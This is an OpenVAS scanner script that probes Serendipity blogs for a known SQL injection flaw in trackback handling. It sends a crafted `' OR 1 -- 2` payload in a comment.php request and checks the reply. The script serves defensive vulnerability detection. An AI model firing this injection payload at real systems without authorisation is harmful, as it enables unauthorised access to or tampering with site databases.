###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_serendipity_53620.nasl 6720 2017-07-13 14:25:27Z cfischer $
#
# Serendipity 'functions_trackbacks.inc.php' SQL Injection Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "Serendipity is prone to an SQL-injection vulnerability because it
fails to sufficiently sanitize user-supplied data before using it in
an SQL query.

A successful exploit may allow an attacker to compromise the
application, access or modify data, or exploit latent vulnerabilities
in the underlying database.

Serendipity 1.6.1 is vulnerable; other versions may also be affected.";

tag_solution = "Updates are available; please see the references for details.";

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.103526";
CPE = "cpe:/a:s9y:serendipity";

if (description)
{
 script_oid(SCRIPT_OID);
 script_bugtraq_id(53620);
 script_cve_id("CVE-2012-2762");
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_version ("$Revision: 6720 $");

 script_name("Serendipity 'functions_trackbacks.inc.php' SQL Injection Vulnerability");

 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/53620");
 script_xref(name : "URL" , value : "https://github.com/s9y/Serendipity/commit/87153991d06bc18fe4af05f97810487c4a340a92#diff-1");
 script_xref(name : "URL" , value : "http://blog.s9y.org/archives/241-Serendipity-1.6.2-released.html");
 script_xref(name : "URL" , value : "http://www.s9y.org/");
 script_xref(name : "URL" , value : "https://www.htbridge.com/advisory/HTB23092");

 script_tag(name:"last_modification", value:"$Date: 2017-07-13 16:25:27 +0200 (Thu, 13 Jul 2017) $");
 script_tag(name:"creation_date", value:"2012-07-25 14:02:47 +0200 (Wed, 25 Jul 2012)");
 script_category(ACT_ATTACK);
 script_tag(name:"qod_type", value:"remote_active");
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
 script_dependencies("serendipity_detect.nasl");
 script_require_ports("Services/www", 80);
 script_mandatory_keys("Serendipity/installed");

 script_tag(name : "solution" , value : tag_solution);
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
include("global_settings.inc");
   
if(!port = get_app_port(cpe:CPE, nvt:SCRIPT_OID))exit(0);
if(!dir = get_app_location(cpe:CPE, nvt:SCRIPT_OID, port:port))exit(0);

url = dir + '/comment.php?type=trackback&entry_id=1&url=%27%20OR%201%20--%202';

if(http_vuln_check(port:port, url:url,pattern:"<error>1</error>",extra_check:"trackback failed")) {
     
  security_message(port:port);
  exit(0);

}

exit(0);

